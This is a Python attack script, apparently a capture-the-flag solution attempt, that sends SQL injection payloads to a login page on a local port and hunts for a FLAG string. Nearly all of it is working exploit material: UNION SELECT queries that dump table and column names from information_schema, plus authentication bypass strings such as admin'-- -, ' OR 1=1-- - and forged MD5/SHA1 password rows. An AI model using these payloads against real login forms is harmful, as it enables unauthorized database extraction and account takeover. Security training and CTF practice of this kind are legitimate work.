import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[INVESTIGATION] Extract database structure using information_schema\n")

# Query information_schema to understand the table structure
print("="*80)
print("[PHASE 1] Extract table names from database")
print("="*80)

schema_payloads = [
    "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -",
    "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -",
]

for payload in schema_payloads:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    print(f"\nPayload: {payload[:80]}")
    print(f"Response length: {len(resp.text)}")
    
    # The injected data might appear in the response somewhere
    # Let's look for non-standard content
    if len(resp.text) != 3173:
        print(f"[!] DIFFERENT RESPONSE!")
        print(resp.text)
    
    if 'FLAG{' in resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        print(f"[!!! FLAG FOUND !!!]: {flag_match.group(0)}")
        exit(0)

# Extract column names
print("\n" + "="*80)
print("[PHASE 2] Extract column names from users table")
print("="*80)

column_payloads = [
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -",
    "' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -",
    "' UNION SELECT column_name,column_type,3 FROM information_schema.columns WHERE table_name='users' LIMIT 0,1-- -",
    "' UNION SELECT column_name,column_type,3 FROM information_schema.columns WHERE table_name='users' LIMIT 1,1-- -",
    "' UNION SELECT column_name,column_type,3 FROM information_schema.columns WHERE table_name='users' LIMIT 2,1-- -",
]

for payload in column_payloads:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    print(f"\nPayload: {payload[:80]}")
    print(f"Response length: {len(resp.text)}")
    
    if len(resp.text) != 3173:
        print(f"[!] DIFFERENT RESPONSE!")
        print(resp.text[:500])

# Maybe the check is based on password hash matching
print("\n" + "="*80)
print("[PHASE 3] Check if authentication uses password hashing")
print("="*80)

# Try to bypass by making the password check always true
hash_bypass_payloads = [
    ("admin' AND 1=1 UNION SELECT 'admin','x',1-- -", "x"),
    ("admin' AND 1=2 UNION SELECT 'admin','x',1-- -", "x"),  # Should fail
    ("' UNION SELECT 'admin',MD5('admin'),1-- -", "admin"),
    ("' UNION SELECT 'admin',SHA1('admin'),1-- -", "admin"),
]

for user, pwd in hash_bypass_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND !!!]")
        print(f"Payload: username={user}, password={pwd}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_error = "not the admin" in resp.text.lower()
    print(f"[{'✗' if has_error else '?'}] {user[:60]:60s} | {'not admin' if has_error else 'SUCCESS?'}")

# Let's check if there's any cookies or session being set
print("\n" + "="*80)
print("[PHASE 4] Check for cookies/session")
print("="*80)

resp = requests.get(target, params={'username': "admin'-- -", 'password': 'x'})
print(f"Cookies returned: {dict(resp.cookies)}")
print(f"Headers: {dict(resp.headers)}")

# Maybe we need to look at what happens when we successfully login but are not admin
# vs when we fail to login entirely
print("\n" + "="*80)
print("[PHASE 5] Compare invalid user vs valid non-admin user")
print("="*80)

test_cases = [
    ("nonexistent_user_xyz", "password", "Non-existent user"),
    ("admin'-- -", "x", "SQL injection (should auth as admin)"),
    ("' OR 1=1-- -", "x", "SQL injection (should return first user)"),
]

for user, pwd, desc in test_cases:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    print(f"\n{desc}:")
    print(f"  Length: {len(resp.text)} bytes")
    print(f"  Has 'not the admin': {'not the admin' in resp.text.lower()}")
    print(f"  Has 'login': {'login' in resp.text.lower()}")
    
    if 'FLAG{' in resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        print(f"  [!!! FLAG FOUND !!!]: {flag_match.group(0)}")
        print(resp.text)
        exit(0)

print("\n[COMPLETE] Database structure investigation complete")

